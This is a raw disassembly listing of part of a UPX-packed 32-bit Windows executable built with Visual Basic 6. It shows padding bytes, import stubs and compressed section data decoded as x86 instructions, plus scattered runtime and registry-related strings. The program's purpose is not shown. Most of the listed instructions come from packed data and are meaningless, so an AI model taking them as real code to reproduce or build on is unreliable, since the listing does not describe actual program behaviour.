  40b15c:	cc                   	int3
  40b15d:	cc                   	int3
  40b15e:	cc                   	int3
  40b15f:	cc                   	int3
  40b160:	e9 e9 e9 e9 cc       	jmp    0xcd2a9b4e
  40b165:	cc                   	int3
  40b166:	cc                   	int3
  40b167:	cc                   	int3
  40b168:	cc                   	int3
  40b169:	cc                   	int3
  40b16a:	cc                   	int3
  40b16b:	cc                   	int3
  40b16c:	cc                   	int3
  40b16d:	cc                   	int3
  40b16e:	cc                   	int3
  40b16f:	cc                   	int3
  40b170:	9e                   	sahf
  40b171:	9e                   	sahf
  40b172:	9e                   	sahf
  40b173:	9e                   	sahf
	...
  40b180:	20 b2 00 00 00 00    	and    %dh,0x0(%edx)
	...
  40b19a:	00 00                	add    %al,(%eax)
  40b19c:	2e b2 00             	cs mov $0x0,%dl
  40b19f:	00 51 02             	add    %dl,0x2(%ecx)
  40b1a2:	00 80 52 02 00 80    	add    %al,-0x7ffffdae(%eax)
  40b1a8:	53                   	push   %ebx
  40b1a9:	02 00                	add    (%eax),%al
  40b1ab:	80 56 02 00          	adcb   $0x0,0x2(%esi)
  40b1af:	80 0d 02 00 80 0e 02 	orb    $0x2,0xe800002
  40b1b6:	00 80 40 b2 00 00    	add    %al,0xb240(%eax)
  40b1bc:	11 02                	adc    %eax,(%edx)
  40b1be:	00 80 54 b2 00 00    	add    %al,0xb254(%eax)
  40b1c4:	9e                   	sahf
  40b1c5:	02 00                	add    (%eax),%al
  40b1c7:	80 66 b2 00          	andb   $0x0,-0x4e(%esi)
  40b1cb:	00 58 02             	add    %bl,0x2(%eax)
  40b1ce:	00 80 59 02 00 80    	add    %al,-0x7ffffda7(%eax)
  40b1d4:	7c b2                	jl     0x40b188
  40b1d6:	00 00                	add    %al,(%eax)
  40b1d8:	98                   	cwtl
  40b1d9:	b2 00                	mov    $0x0,%dl
  40b1db:	00 5f 02             	add    %bl,0x2(%edi)
  40b1de:	00 80 60 02 00 80    	add    %al,-0x7ffffda0(%eax)
  40b1e4:	12 02                	adc    (%edx),%al
  40b1e6:	00 80 cc 02 00 80    	add    %al,-0x7ffffd34(%eax)
  40b1ec:	ae                   	scas   %es:(%edi),%al
  40b1ed:	b2 00                	mov    $0x0,%dl
  40b1ef:	00 19                	add    %bl,(%ecx)
  40b1f1:	02 00                	add    (%eax),%al
  40b1f3:	80 85 02 00 80 3a 02 	addb   $0x2,0x3a800002(%ebp)
  40b1fa:	00 80 ad 02 00 80    	add    %al,-0x7ffffd53(%eax)
  40b200:	64 00 00             	add    %al,%fs:(%eax)
  40b203:	80 68 02 00          	subb   $0x0,0x2(%eax)
  40b207:	80 1e 02             	sbbb   $0x2,(%esi)
  40b20a:	00 80 21 02 00 80    	add    %al,-0x7ffffddf(%eax)
  40b210:	22 02                	and    (%edx),%al
  40b212:	00 80 23 02 00 80    	add    %al,-0x7ffffddd(%eax)
  40b218:	44                   	inc    %esp
  40b219:	02 00                	add    (%eax),%al
  40b21b:	80 00 00             	addb   $0x0,(%eax)
	...

Disassembly of section UPX1:

00411000 <UPX1>:
	...
  413000:	65 00 00             	add    %al,%gs:(%eax)
  413003:	00 00                	add    %al,(%eax)
  413005:	00 00                	add    %al,(%eax)
  413007:	00 01                	add    %al,(%ecx)
  413009:	4d                   	dec    %ebp
  41300a:	65 74 68             	gs je  0x413075
  41300d:	43                   	inc    %ebx
  41300e:	61                   	popa
  41300f:	6c                   	insb   (%dx),%es:(%edi)
  413010:	6c                   	insb   (%dx),%es:(%edi)
  413011:	45                   	inc    %ebp
  413012:	6e                   	outsb  %ds:(%esi),(%dx)
  413013:	67 69 6e 65 00 ff 51 	imul   $0x251ff00,0x65(%bp),%ebp
  41301a:	02 
  41301b:	ff 52 02             	call   *0x2(%edx)
  41301e:	ff 53 02             	call   *0x2(%ebx)
  413021:	ff 56 02             	call   *0x2(%esi)
  413024:	ff 0d 02 ff 0e 02    	decl   0x20eff02
  41302a:	01 45 56             	add    %eax,0x56(%ebp)
  41302d:	45                   	inc    %ebp
  41302e:	4e                   	dec    %esi
  41302f:	54                   	push   %esp
  413030:	5f                   	pop    %edi
  413031:	53                   	push   %ebx
  413032:	49                   	dec    %ecx
  413033:	4e                   	dec    %esi
  413034:	4b                   	dec    %ebx
  413035:	5f                   	pop    %edi
  413036:	41                   	inc    %ecx
  413037:	64 64 52             	fs fs push %edx
  41303a:	65 66 00 ff          	gs data16 add %bh,%bh
  41303e:	11 02                	adc    %eax,(%edx)
  413040:	01 44 6c 6c          	add    %eax,0x6c(%esp,%ebp,2)
  413044:	46                   	inc    %esi
  413045:	75 6e                	jne    0x4130b5
  413047:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  41304b:	6e                   	outsb  %ds:(%esi),(%dx)
  41304c:	43                   	inc    %ebx
  41304d:	61                   	popa
  41304e:	6c                   	insb   (%dx),%es:(%edi)
  41304f:	6c                   	insb   (%dx),%es:(%edi)
  413050:	00 ff                	add    %bh,%bh
  413052:	9e                   	sahf
  413053:	02 01                	add    (%ecx),%al
  413055:	45                   	inc    %ebp
  413056:	56                   	push   %esi
  413057:	45                   	inc    %ebp
  413058:	4e                   	dec    %esi
  413059:	54                   	push   %esp
  41305a:	5f                   	pop    %edi
  41305b:	53                   	push   %ebx
  41305c:	49                   	dec    %ecx
  41305d:	4e                   	dec    %esi
  41305e:	4b                   	dec    %ebx
  41305f:	5f                   	pop    %edi
  413060:	52                   	push   %edx
  413061:	65 6c                	gs insb (%dx),%es:(%edi)
  413063:	65 61                	gs popa
  413065:	73 65                	jae    0x4130cc
  413067:	00 ff                	add    %bh,%bh
  413069:	58                   	pop    %eax
  41306a:	02 ff                	add    %bh,%bh
  41306c:	59                   	pop    %ecx
  41306d:	02 01                	add    (%ecx),%al
  41306f:	45                   	inc    %ebp
  413070:	56                   	push   %esi
  413071:	45                   	inc    %ebp
  413072:	4e                   	dec    %esi
  413073:	54                   	push   %esp
  413074:	5f                   	pop    %edi
  413075:	53                   	push   %ebx
  413076:	49                   	dec    %ecx
  413077:	4e                   	dec    %esi
  413078:	4b                   	dec    %ebx
  413079:	5f                   	pop    %edi
  41307a:	51                   	push   %ecx
  41307b:	75 65                	jne    0x4130e2
  41307d:	72 79                	jb     0x4130f8
  41307f:	49                   	dec    %ecx
  413080:	6e                   	outsb  %ds:(%esi),(%dx)
  413081:	74 65                	je     0x4130e8
  413083:	72 66                	jb     0x4130eb
  413085:	61                   	popa
  413086:	63 65 00             	arpl   %esp,0x0(%ebp)
  413089:	01 5f 5f             	add    %ebx,0x5f(%edi)
  41308c:	76 62                	jbe    0x4130f0
  41308e:	61                   	popa
  41308f:	45                   	inc    %ebp
  413090:	78 63                	js     0x4130f5
  413092:	65 70 74             	gs jo  0x413109
  413095:	48                   	dec    %eax
  413096:	61                   	popa
  413097:	6e                   	outsb  %ds:(%esi),(%dx)
  413098:	64 6c                	fs insb (%dx),%es:(%edi)
  41309a:	65 72 00             	gs jb  0x41309d
  41309d:	ff 5f 02             	lcall  *0x2(%edi)
  4130a0:	ff 60 02             	jmp    *0x2(%eax)
  4130a3:	ff 12                	call   *(%edx)
  4130a5:	02 ff                	add    %bh,%bh
  4130a7:	cc                   	int3
  4130a8:	02 01                	add    (%ecx),%al
  4130aa:	50                   	push   %eax
  4130ab:	72 6f                	jb     0x41311c
  4130ad:	63 43 61             	arpl   %eax,0x61(%ebx)
  4130b0:	6c                   	insb   (%dx),%es:(%edi)
  4130b1:	6c                   	insb   (%dx),%es:(%edi)
  4130b2:	45                   	inc    %ebp
  4130b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4130b4:	67 69 6e 65 00 ff 19 	imul   $0x219ff00,0x65(%bp),%ebp
  4130bb:	02 
  4130bc:	ff 85 02 ff 3a 02    	incl   0x23aff02(%ebp)
  4130c2:	ff ad 02 ff 64 00    	ljmp   *0x64ff02(%ebp)
  4130c8:	ff 68 02             	ljmp   *0x2(%eax)
  4130cb:	ff 1e                	lcall  *(%esi)
  4130cd:	02 ff                	add    %bh,%bh
  4130cf:	21 02                	and    %eax,(%edx)
  4130d1:	ff 22                	jmp    *(%edx)
  4130d3:	02 ff                	add    %bh,%bh
  4130d5:	23 02                	and    (%edx),%eax
  4130d7:	ff 44 02 00          	incl   0x0(%edx,%eax,1)
  4130db:	00 00                	add    %al,(%eax)
  4130dd:	00 00                	add    %al,(%eax)
  4130df:	50                   	push   %eax
  4130e0:	45                   	inc    %ebp
  4130e1:	00 00                	add    %al,(%eax)
  4130e3:	4c                   	dec    %esp
  4130e4:	01 03                	add    %eax,(%ebx)
  4130e6:	00 c6                	add    %al,%dh
  4130e8:	d7                   	xlat   %ds:(%ebx)
  4130e9:	62 49 00             	bound  %ecx,0x0(%ecx)
  4130ec:	00 00                	add    %al,(%eax)
  4130ee:	00 00                	add    %al,(%eax)
  4130f0:	00 00                	add    %al,(%eax)
  4130f2:	00 e0                	add    %ah,%al
  4130f4:	00 0f                	add    %cl,(%edi)
  4130f6:	01 0b                	add    %ecx,(%ebx)
  4130f8:	01 06                	add    %eax,(%esi)
  4130fa:	00 00                	add    %al,(%eax)
  4130fc:	b0 00                	mov    $0x0,%al
  4130fe:	00 00                	add    %al,(%eax)
  413100:	70 00                	jo     0x413102
  413102:	00 00                	add    %al,(%eax)
  413104:	00 00                	add    %al,(%eax)
  413106:	00 50 11             	add    %dl,0x11(%eax)
  413109:	00 00                	add    %al,(%eax)
  41310b:	00 10                	add    %dl,(%eax)
  41310d:	00 00                	add    %al,(%eax)
  41310f:	00 c0                	add    %al,%al
  413111:	00 00                	add    %al,(%eax)
  413113:	00 00                	add    %al,(%eax)
  413115:	40                   	inc    %eax
  413116:	00 00                	add    %al,(%eax)
  413118:	10 00                	adc    %al,(%eax)
  41311a:	00 00                	add    %al,(%eax)
  41311c:	10 00                	adc    %al,(%eax)
  41311e:	00 04 00             	add    %al,(%eax,%eax,1)
  413121:	00 00                	add    %al,(%eax)
  413123:	01 00                	add    %eax,(%eax)
  413125:	00 00                	add    %al,(%eax)
  413127:	04 00                	add    $0x0,%al
  413129:	00 00                	add    %al,(%eax)
  41312b:	00 00                	add    %al,(%eax)
  41312d:	00 00                	add    %al,(%eax)
  41312f:	00 30                	add    %dh,(%eax)
  413131:	01 00                	add    %eax,(%eax)
  413133:	00 10                	add    %dl,(%eax)
  413135:	00 00                	add    %al,(%eax)
  413137:	e3 80                	jecxz  0x4130b9
  413139:	01 00                	add    %eax,(%eax)
  41313b:	02 00                	add    (%eax),%al
  41313d:	00 00                	add    %al,(%eax)
  41313f:	00 00                	add    %al,(%eax)
  413141:	10 00                	adc    %al,(%eax)
  413143:	00 10                	add    %dl,(%eax)
  413145:	00 00                	add    %al,(%eax)
  413147:	00 00                	add    %al,(%eax)
  413149:	10 00                	adc    %al,(%eax)
  41314b:	00 10                	add    %dl,(%eax)
  41314d:	00 00                	add    %al,(%eax)
  41314f:	00 00                	add    %al,(%eax)
  413151:	00 00                	add    %al,(%eax)
  413153:	10 00                	adc    %al,(%eax)
	...
  41315d:	00 00                	add    %al,(%eax)
  41315f:	74 b1                	je     0x413112
  413161:	00 00                	add    %al,(%eax)
  413163:	28 00                	sub    %al,(%eax)
  413165:	00 00                	add    %al,(%eax)
  413167:	00 d0                	add    %dl,%al
  413169:	00 00                	add    %al,(%eax)
  41316b:	d0 5b 00             	rcrb   $1,0x0(%ebx)
	...
  4131ae:	00 28                	add    %ch,(%eax)
  4131b0:	02 00                	add    (%eax),%al
  4131b2:	00 20                	add    %ah,(%eax)
  4131b4:	00 00                	add    %al,(%eax)
  4131b6:	00 00                	add    %al,(%eax)
  4131b8:	10 00                	adc    %al,(%eax)
  4131ba:	00 84 00 00 00 00 00 	add    %al,0x0(%eax,%eax,1)
	...
  4131d5:	00 00                	add    %al,(%eax)
  4131d7:	2e 74 65             	je,pn  0x41323f
  4131da:	78 74                	js     0x413250
  4131dc:	00 00                	add    %al,(%eax)
  4131de:	00 c0                	add    %al,%al
  4131e0:	a2 00 00 00 10       	mov    %al,0x10000000
  4131e5:	00 00                	add    %al,(%eax)
  4131e7:	00 b0 00 00 00 10    	add    %dh,0x10000000(%eax)
	...
  4131f9:	00 00                	add    %al,(%eax)
  4131fb:	20 00                	and    %al,(%eax)
  4131fd:	00 60 2e             	add    %ah,0x2e(%eax)
  413200:	64 61                	fs popa
  413202:	74 61                	je     0x413265
  413204:	00 00                	add    %al,(%eax)
  413206:	00 b8 0f 00 00 00    	add    %bh,0xf(%eax)
  41320c:	c0 00 00             	rolb   $0x0,(%eax)
	...
  413223:	40                   	inc    %eax
  413224:	00 00                	add    %al,(%eax)
  413226:	c0 2e 72             	shrb   $0x72,(%esi)
  413229:	73 72                	jae    0x41329d
  41322b:	63 00                	arpl   %eax,(%eax)
  41322d:	00 00                	add    %al,(%eax)
  41322f:	d0 5b 00             	rcrb   $1,0x0(%ebx)
  413232:	00 00                	add    %al,(%eax)
  413234:	d0 00                	rolb   $1,(%eax)
  413236:	00 00                	add    %al,(%eax)
  413238:	60                   	pusha
  413239:	00 00                	add    %al,(%eax)
  41323b:	00 c0                	add    %al,%al
	...
  413249:	00 00                	add    %al,(%eax)
  41324b:	40                   	inc    %eax
  41324c:	00 00                	add    %al,(%eax)
  41324e:	40                   	inc    %eax
  41324f:	00 20                	add    %ah,(%eax)
  413251:	01 00                	add    %eax,(%eax)
  413253:	00 00                	add    %al,(%eax)
  413255:	00 00                	add    %al,(%eax)
  413257:	00 00                	add    %al,(%eax)
  413259:	df 20                	fbld   (%eax)
  41325b:	01 00                	add    %eax,(%eax)
  41325d:	cd ad                	int    $0xad
  41325f:	b9 28 8f 97 73       	mov    $0x73978f28,%ecx
  413264:	88 a5 99 bf c3 de    	mov    %ah,-0x213c4067(%ebp)
  41326a:	92                   	xchg   %eax,%edx
  41326b:	cf                   	iret
  41326c:	04 28                	add    $0x28,%al
  41326e:	9b                   	fwait
  41326f:	34 0b                	xor    $0xb,%al
  413271:	25 2f 79 c9 70       	and    $0x70c9792f,%eax
  413276:	91                   	xchg   %eax,%ecx
  413277:	84 ab 60 a9 92 97    	test   %ch,-0x686d56a0(%ebx)
  41327d:	bc e4 6c a7 28       	mov    $0x28a76ce4,%esp
  413282:	8f                   	(bad)
  413283:	58                   	pop    %eax
  413284:	97                   	xchg   %eax,%edi
  413285:	87 c1                	xchg   %eax,%ecx
  413287:	5b                   	pop    %ebx
  413288:	f2 88 a5 74 2b 04 e7 	repnz mov %ah,-0x18fbd48c(%ebp)
  41328f:	4e                   	dec    %esi
  413290:	f2 25 f4 01 00 60    	repnz and $0x600001f4,%eax
  413296:	b1 b7                	mov    $0xb7,%cl
  413298:	03 0d b2 f4 55 b8    	add    0xb855f4b2,%ecx
  41329e:	cc                   	int3
  41329f:	c0 c3 26             	rol    $0x26,%bl
  4132a2:	2a d0                	sub    %al,%dl
  4132a4:	f0 70 c8             	lock jo 0x41326f
  4132a7:	e3 3a                	jecxz  0x4132e3
  4132a9:	19 4c 07 70          	sbb    %ecx,0x70(%edi,%eax,1)
  4132ad:	d7                   	xlat   %ds:(%ebx)
  4132ae:	75 23                	jne    0x4132d3
  4132b0:	dc 05 54 00 72 01    	faddl  0x1720054
  4132b6:	68 13 56 09 72       	push   $0x72095613
  4132bb:	fd                   	std
  4132bc:	ae                   	scas   %es:(%edi),%al
  4132bd:	eb ba                	jmp    0x413279
  4132bf:	07                   	pop    %es
  4132c0:	25 4d 1f 75 13       	and    $0x13751f4d,%eax
  4132c5:	50                   	push   %eax
  4132c6:	11 6f 0f             	adc    %ebp,0xf(%edi)
  4132c9:	b7 00                	mov    $0x0,%bh
  4132cb:	5b                   	pop    %ebx
  4132cc:	b2 33                	mov    $0x33,%dl
  4132ce:	0b 09                	or     (%ecx),%ecx
  4132d0:	2e 35 62 3d 06 8e    	cs xor $0x8e063d62,%eax
  4132d6:	2a 32                	sub    (%edx),%dh
  4132d8:	00 98 eb c8 64 30    	add    %bl,0x3064c8eb(%eax)
  4132de:	89 1d 97 9f a8 16    	mov    %ebx,0x16a89f97
  4132e4:	07                   	pop    %es
  4132e5:	eb 0d                	jmp    0x4132f4
  4132e7:	80 13 ef             	adcb   $0xef,(%ebx)
  4132ea:	50                   	push   %eax
  4132eb:	76 db                	jbe    0x4132c8
  4132ed:	66 70 39             	data16 jo 0x413329
  4132f0:	c8 1a d4 57          	enter  $0xd41a,$0x57
  4132f4:	e8 75 7f cf 2e       	call   0x2f10b26e
  4132f9:	b7 82                	mov    $0x82,%bh
  4132fb:	56                   	push   %esi
  4132fc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4132fd:	28 64 76 0f          	sub    %ah,0xf(%esi,%esi,2)
  413301:	6c                   	insb   (%dx),%es:(%edi)
  413302:	76 c0                	jbe    0x4132c4
  413304:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  413305:	0b 06                	or     (%esi),%eax
  413307:	e7 0f                	out    %eax,$0xf
  413309:	03 41 57             	add    0x57(%ecx),%eax
  41330c:	a0 dd 4d b7 01       	mov    0x1b74ddd,%al
  413311:	68 09 1b 0b ac       	push   $0xac0b1b09
  413316:	eb 94                	jmp    0x4132ac
  413318:	c0 83 9f 80 d1 19 2f 	rolb   $0x2f,0x19d1809f(%ebx)
  41331f:	80 71 2b 20          	xorb   $0x20,0x2b(%ecx)
  413323:	31 c8                	xor    %ecx,%eax
  413325:	72 c0                	jb     0x4132e7
  413327:	6b 96 9c 83 d3 bd ee 	imul   $0xffffffee,-0x422c7c64(%esi),%edx
  41332e:	81 47 74 1b 60 07 0b 	addl   $0xb07601b,0x74(%edi)
  413335:	5c                   	pop    %esp
  413336:	9a ba 03 5d 68 03 a4 	lcall  $0xa403,$0x685d03ba
  41333d:	57                   	push   %edi
  41333e:	03 a2 ff b8 ed ba    	add    -0x45124701(%edx),%esp
  413344:	cb                   	lret
  413345:	7a 7d                	jp     0x4133c4
  413347:	0b 58 0b             	or     0xb(%eax),%ebx
  41334a:	9c                   	pushf
  41334b:	03 88 6d cd 72 7b    	add    0x7b72cd6d(%eax),%ecx
  413351:	61                   	popa
  413352:	bb e8 b0 5f 8c       	mov    $0x8c5fb0e8,%ebx
  413357:	90                   	nop
  413358:	f8                   	clc
  413359:	08 45 60             	or     %al,0x60(%ebp)
  41335c:	e4 89                	in     $0x89,%al
  41335e:	7c 1b                	jl     0x41337b
  413360:	14 18                	adc    $0x18,%al
  413362:	f7 d6                	not    %esi
  413364:	44                   	inc    %esp
  413365:	77 59                	ja     0x4133c0
  413367:	d9 ec                	fldlg2
  413369:	ab                   	stos   %eax,%es:(%edi)
  41336a:	90                   	nop
  41336b:	1b 28                	sbb    (%eax),%ebp
  41336d:	17                   	pop    %ss
  41336e:	40                   	inc    %eax
  41336f:	9a ee 0b 05 38 27 a4 	lcall  $0xa427,$0x38050bee
  413376:	02 26                	add    (%esi),%ah
  413378:	66 cd 72             	data16 int $0x72
  41337b:	54                   	push   %esp
  41337c:	77 a0                	ja     0x41331e
  41337e:	b4 17                	mov    $0x17,%ah
  413380:	6b d3 5d             	imul   $0x5d,%ebx,%edx
  413383:	c8 e6 1f 00          	enter  $0x1fe6,$0x0
  413387:	3c bc                	cmp    $0xbc,%al
  413389:	7c 70                	jl     0x4133fb
  41338b:	27                   	daa
  41338c:	b0 08                	mov    $0x8,%al
  41338e:	82 3b 58             	cmpb   $0x58,(%ebx)
  413391:	cc                   	int3
  413392:	17                   	pop    %ss
  413393:	0b 78 29             	or     0x29(%eax),%edi
  413396:	73 02                	jae    0x41339a
  413398:	5b                   	pop    %ebx
  413399:	49                   	dec    %ecx
  41339a:	7c 23                	jl     0x4133bf
  41339c:	70 75                	jo     0x413413
  41339e:	73 00                	jae    0x4133a0
  4133a0:	06                   	push   %es
  4133a1:	1b c0                	sbb    %eax,%eax
  4133a3:	8e 94 67 18 83 bc 15 	mov    0x15bc8318(%edi,%eiz,2),%ss
  4133aa:	f6 06 42             	testb  $0x42,(%esi)
  4133ad:	04 33                	add    $0x33,%al
  4133af:	00 ee                	add    %ch,%dh
  4133b1:	c3                   	ret
  4133b2:	3f                   	aas
  4133b3:	0c b8                	or     $0xb8,%al
  4133b5:	44                   	inc    %esp
  4133b6:	66 3d 33 c0          	cmp    $0xc033,%ax
  4133ba:	ba b1 68 44 8e       	mov    $0x8e4468b1,%edx
  4133bf:	f8                   	clc
  4133c0:	86 3c ec             	xchg   %bh,(%esp,%ebp,8)
  4133c3:	c3                   	ret
  4133c4:	b8 38 13 8c 90       	mov    $0x908c1338,%eax
  4133c9:	2b d8                	sub    %eax,%ebx
  4133cb:	ff 6e c0             	ljmp   *-0x40(%esi)
  4133ce:	e8 a3 e8 b7 c8       	call   0xc8f91c76
  4133d3:	0f 6c                	(bad)
  4133d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4133d6:	5f                   	pop    %edi
  4133d7:	66 1d 62 41          	sbb    $0x4162,%ax
  4133db:	49                   	dec    %ecx
  4133dc:	64 9f                	fs lahf
  4133de:	a1 ff a0 06 1e       	mov    0x1e06a0ff,%eax
  4133e3:	3c 42                	cmp    $0x42,%al
  4133e5:	1c 4e                	sbb    $0x4e,%al
  4133e7:	07                   	pop    %es
  4133e8:	0a 21                	or     (%ecx),%ah
  4133ea:	01 80 bb e0 3d 32    	add    %eax,0x323de0bb(%eax)
  4133f0:	35 d8 4b b7 03       	xor    $0x3b74bd8,%eax
  4133f5:	61                   	popa
  4133f6:	bf 43 90 27 07       	mov    $0x7279043,%edi
  4133fb:	4b                   	dec    %ebx
  4133fc:	b8 7d 2b e0 e7       	mov    $0xe7e02b7d,%eax
  413401:	4e                   	dec    %esi
  413402:	7a e4                	jp     0x4133e8
  413404:	7a 0b                	jp     0x413411
  413406:	c0 07 69             	rolb   $0x69,(%edi)
  413409:	83 80 21 bf 43 31 14 	addl   $0x14,0x3143bf21(%eax)
  413410:	2f                   	das
  413411:	2f                   	das
  413412:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  413413:	7f f1                	jg     0x413406
  413415:	c8 4d 73 f0          	enter  $0x734d,$0xf0
  413419:	00 b0 58 1b 03 80    	add    %dh,-0x7ffce4a8(%eax)
  41341f:	11 91 4f 9e 9d fb    	adc    %edx,-0x46261b1(%ecx)
  413425:	70 5f                	jo     0x413486
  413427:	44                   	inc    %esp
  413428:	7e 1c                	jle    0x413446
  41342a:	c0 40 07 f9          	rolb   $0xf9,0x7(%eax)
  41342e:	5e                   	pop    %esi
  41342f:	90                   	nop
  413430:	fc                   	cld
  413431:	00 5f 01             	add    %bl,0x1(%edi)
  413434:	30 6e 3b             	xor    %ch,0x3b(%esi)
  413437:	4f                   	dec    %edi
  413438:	7a 61                	jp     0x41349b
  41343a:	2f                   	das
  41343b:	60                   	pusha
  41343c:	c0 63 08 7b          	shlb   $0x7b,0x8(%ebx)
  413440:	2f                   	das
  413441:	83 5c c8 2b 94       	sbbl   $0xffffff94,0x2b(%eax,%ecx,8)
  413446:	6c                   	insb   (%dx),%es:(%edi)
  413447:	80 0c 0b 39          	orb    $0x39,(%ebx,%ecx,1)
  41344b:	80 34 02 14          	xorb   $0x14,(%edx,%eax,1)
  41344f:	6b 06 d8             	imul   $0xffffffd8,(%esi),%eax
  413452:	69 90 c0 18 23 8f a4 	imul   $0xc86419a4,-0x70dce740(%eax),%edx
  413459:	19 64 c8 
  41345c:	5f                   	pop    %edi
  41345d:	a0 1c 01 83 5c       	mov    0x5c83011c,%al
  413462:	c8 01 8c 71          	enter  $0x8c01,$0x71
  413466:	70 28                	jo     0x413490
  413468:	0b 39                	or     (%ecx),%edi
  41346a:	80 34 1b bc          	xorb   $0xbc,(%ebx,%ebx,1)
  41346e:	6a d8                	push   $0xffffffd8
  413470:	21 64 90 b0          	and    %esp,-0x50(%eax,%edx,4)
  413474:	38 08                	cmp    %cl,(%eax)
  413476:	6d                   	insl   (%dx),%es:(%edi)
  413477:	ef                   	out    %eax,(%dx)
  413478:	0c 21                	or     $0x21,%al
  41347a:	83 5c 3c 48 cc       	sbbl   $0xffffffcc,0x48(%esp,%edi,1)
  41347f:	10 32                	adc    %dh,(%edx)
  413481:	d8 90 90 5f 54 21    	fcoms  0x21545f90(%eax)
  413487:	83 0c d9 6c          	orl    $0x6c,(%ecx,%ebx,8)
  41348b:	2f                   	das
  41348c:	2c 6c                	sub    $0x6c,%al
  41348e:	42                   	inc    %edx
  41348f:	d1 08                	rorl   $1,(%eax)
  413491:	0b 00                	or     (%eax),%eax
  413493:	4b                   	dec    %ebx
  413494:	15 c9 22 5a df       	adc    $0xdf5a22c9,%eax
  413499:	9f                   	lahf
  41349a:	fd                   	std
  41349b:	c1 de 7f             	rcr    $0x7f,%esi
  41349e:	6c                   	insb   (%dx),%es:(%edi)
  41349f:	61                   	popa
  4134a0:	73 73                	jae    0x413515
  4134a2:	0d 6d 6f 64 75       	or     $0x75646f6d,%eax
  4134a7:	6c                   	insb   (%dx),%es:(%edi)
  4134a8:	65 0c 7a             	gs or  $0x7a,%al
  4134ab:	69 70 5d c2 d5 61 0f 	imul   $0xf61d5c2,0x5d(%eax),%esi
  4134b2:	62                   	(bad)
  4134b3:	f4                   	hlt
  4134b4:	bb 50 49 fb 27       	mov    $0x27fb4950,%ebx
  4134b9:	73 87                	jae    0x413442
  4134bb:	0f 72                	(bad)
  4134bd:	0e                   	push   %cs
  4134be:	0b 65 67             	or     0x67(%ebp),%esp
  4134c1:	69 73 74 72 79 0f fb 	imul   $0xfb0f7972,0x74(%ebx),%esi
  4134c8:	60                   	pusha
  4134c9:	ef                   	out    %eax,(%dx)
  4134ca:	0f 75 6e 74          	pcmpeqw 0x74(%esi),%mm5
  4134ce:	69 6c 57 0f 70 61 74 	imul   $0x68746170,0xf(%edi,%edx,2),%ebp
  4134d5:	68 
  4134d6:	1b b0 91 e7 0f 63    	sbb    0x630fe791(%eax),%esi
  4134dc:	68 65 63 6b 4d       	push   $0x4d6b6365
  4134e1:	31 17                	xor    %edx,(%edi)
  4134e3:	9a 04 b5 ed 66 34 6e 	lcall  $0x6e34,$0x66edb504
  4134ea:	40                   	inc    %eax
  4134eb:	33 4b 98             	xor    -0x68(%ebx),%ecx
  4134ee:	86 1e                	xchg   %bl,(%esi)
  4134f0:	19 52 1d             	sbb    %edx,0x1d(%edx)
  4134f3:	73 ef                	jae    0x4134e4
  4134f5:	72 75                	jb     0x41356c
  4134f7:	dd 58 74             	fstpl  0x74(%eax)
  4134fa:	09 50 25             	or     %edx,0x25(%eax)
  4134fd:	76 03                	jbe    0x413502
  4134ff:	6c                   	insb   (%dx),%es:(%edi)
  413500:	0d 67 e4 62 90       	or     $0x9062e467,%eax
  413505:	cf                   	iret
  413506:	03 2b                	add    (%ebx),%ebp
  413508:	22 42 2b             	and    0x2b(%edx),%al
  41350b:	b3 10                	mov    $0x10,%bl
  41350d:	d6                   	salc
  41350e:	2c 37                	sub    $0x37,%al
  413510:	6b 70 29 00          	imul   $0x0,0x29(%eax),%esi
  413514:	ff 0f                	decl   (%edi)
  413516:	19 45 22             	sbb    %eax,0x22(%ebp)
  413519:	92                   	xchg   %eax,%edx
  41351a:	b5 46                	mov    $0x46,%ch
  41351c:	57                   	push   %edi
  41351d:	19 0a                	sbb    %ecx,(%edx)
  41351f:	f0 4b                	lock dec %ebx
  413521:	83 72 b6 7f          	xorl   $0x7f,-0x4a(%edx)
  413525:	c8 28 fa a1          	enter  $0xfa28,$0xa1
  413529:	2f                   	das
  41352a:	96                   	xchg   %eax,%esi
  41352b:	ee                   	out    %al,(%dx)
  41352c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41352d:	52                   	push   %edx
  41352e:	7d f9                	jge    0x413529
  413530:	60                   	pusha
  413531:	55                   	push   %ebp
  413532:	dc 00                	faddl  (%eax)
  413534:	43                   	inc    %ebx
  413535:	2c e4                	sub    $0xe4,%al
  413537:	ff 19                	lcall  *(%ecx)
  413539:	46                   	inc    %esi
  41353a:	a1 3b 4d 22 dc       	mov    0xdc224d3b,%eax
  41353f:	2d 1f 4b 5a f7       	sub    $0xf75a4b1f,%eax
  413544:	e6 ff                	out    %al,$0xff
  413546:	ff 86 6a 2e 3d fb    	incl   -0x4c2d196(%esi)
  41354c:	fc                   	cld
  41354d:	fa                   	cli
  41354e:	a0 68 10 a7 38       	mov    0x38a71068,%al
  413553:	08 00                	or     %al,(%eax)
  413555:	2b 33                	sub    (%ebx),%esi
  413557:	71 b5                	jno    0x41350e
  413559:	43                   	inc    %ebx
  41355a:	3a 5c 4c 06          	cmp    0x6(%esp,%ecx,2),%bl
  41355e:	dc fe                	fdivr  %st,%st(6)
  413560:	67 72 61             	addr16 jb 0x4135c4
  413563:	6d                   	insl   (%dx),%es:(%edi)
  413564:	20 46 69             	and    %al,0x69(%esi)
  413567:	dc 73 5c             	fdivl  0x5c(%ebx)
  41356a:	3c 56                	cmp    $0x56,%al
  41356c:	7a f7                	jp     0x413565
  41356e:	ff 2f                	ljmp   *(%edi)
  413570:	29 75 61             	sub    %esi,0x61(%ebp)
  413573:	6c                   	insb   (%dx),%es:(%edi)
  413574:	20 53 74             	and    %dl,0x74(%ebx)
  413577:	75 64                	jne    0x4135dd
  413579:	69 6f 5c 56 42 39 38 	imul   $0x38394256,0x5c(%edi),%ebp
  413580:	04 36                	add    $0x36,%al
  413582:	2e 4f                	cs dec %edi
  413584:	4c                   	dec    %esp
  413585:	e2 5c                	loop   0x4135e3
  413587:	68 ae 67 09 db       	push   $0xdb0967ae
  41358c:	30 7c 49 bb          	xor    %bh,-0x45(%ecx,%ecx,2)
  413590:	6e                   	outsb  %ds:(%esi),(%dx)
  413591:	92                   	xchg   %eax,%edx
  413592:	5b                   	pop    %ebx
  413593:	40                   	inc    %eax
